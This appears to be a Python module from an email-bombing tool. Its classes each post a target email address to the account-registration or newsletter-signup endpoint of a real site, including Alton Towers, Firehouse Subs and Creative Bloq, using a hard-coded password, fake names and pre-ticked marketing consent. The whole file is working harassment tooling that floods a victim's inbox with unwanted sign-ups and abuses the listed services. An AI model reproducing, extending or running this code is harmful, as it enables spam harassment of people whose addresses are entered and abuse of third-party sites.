import aiohttp, time, json

class Endpoint:
    def __init__(self, session: aiohttp.ClientSession):
        self.session = session

PASSWORD = """T)v5q(`'<>2iP29X8a+N"""

class Endpoints:
    class FalconComputers(Endpoint):
        name = "Falcon Computers"
        url = "https://www.falconcomputers.co.uk/myaccount/register"
        async def __call__(self, email: str):
            data = {
                "email": email,
                "confirmemail": email,
                "password": PASSWORD,
                "confirmpassword": PASSWORD
            }
            async with self.session.post("https://www.falconcomputers.co.uk/myaccount/register", data=data, allow_redirects=False) as response:
                return response.status == 302
            
    class AltonTowers(Endpoint):
        name = "Alton Towers"
        url = "https://www.altontowers.com/umbraco/api/signupform/submit"
        async def __call__(self, email: str):
            data = {
                "__RequestVerificationToken": "",
                "Language": "en",
                "Attraction": "PAT",
                "Campaign": "brandsite",
                "Source": "Website",
                "SourceDetail": "www.altontowers.com/sign-up/",
                "ConsentType": "Merlin Global",
                "FallbackCountry": "GB",
                "EnableRecaptcha": "False",
                "Email": email,
                "FirstName": str(time.time()),
                "Lastname": str(time.time()),
                "Permission": "on",
            }
            async with self.session.post("https://www.altontowers.com/umbraco/api/signupform/submit", json=data) as response:
                return response.ok # it returns 200 even if it doesnt send so idk
            
    class Paramore(Endpoint):
        name = "Paramore"
        url = "https://paramore.net/"
        async def __call__(self, email: str):
            data = {
                "countrycode": "GB",
                "email": email,
            }
            async with self.session.post("https://ukstore.paramore.net/a/app/vice-versa/api/subscribe", json=data) as response:
                return response.ok # it returns 200 even if it doesnt send
            
    class FirehouseSubs(Endpoint):
        name = "Firehouse Subs"
        url = "https://www.firehousesubs.com/?triggerSignInAccessibility=true"
        async def __call__(self, email: str):
            data = {
                "operationName": "SignUp",
                "query": "mutation SignUp($input: SignUpUserInput!) {\n  signUp(userInfo: $input)\n}\n",
                "variables": {
                    "input": {
                        "country": "USA",
                        "dob": "",
                        "name": "Fricker",
                        "phoneNumber": "+12312341234",
                        "platform": "web",
                        "stage": "prod",
                        "userName": email,
                        "wantsPromotionalEmails": True,
                        "zipcode": ""
                    }
                }
            }
            async with self.session.post("https://use1-prod-fhs-gateway.rbictg.com/graphql", json=data) as response:
                try:
                    resp = json.loads(await response.text())
                    return not resp.get("errors")
                except Exception:
                    return
            
    class CreativeBloq(Endpoint):
        name = "Creative Bloq"
        url = "https://www.creativebloq.com/"
        async def __call__(self, email: str):
            data = {
                "submission": {
                    "code": "XCQ-X",
                    "consent": {
                        "data": True,
                        "marketing": True
                    },
                    "country": "GB",
                    "email": email,
                    "language": "EN",
                    "name": "",
                    "source": "15"
                }
            }
            async with self.session.post("https://newsletter-subscribe.futureplc.com/v2/submission/submit", json=data) as response:
                return response.ok # it returns 200 even if it doesnt send
        
    class WarnerMusicCanada(Endpoint):
        name = "Warner Music Canada"
        url = "https://store.warnermusic.ca"
        async def __call__(self, email: str):
            data = {
                "email": email,
                "type": "welcome10"
            }
            async with self.session.post("https://stage.store-warnermusiccanada-com.nds.acquia-psi.com/email/send_notification.php", json=data) as response:
                return response.ok # it returns 200 even if it doesnt send
        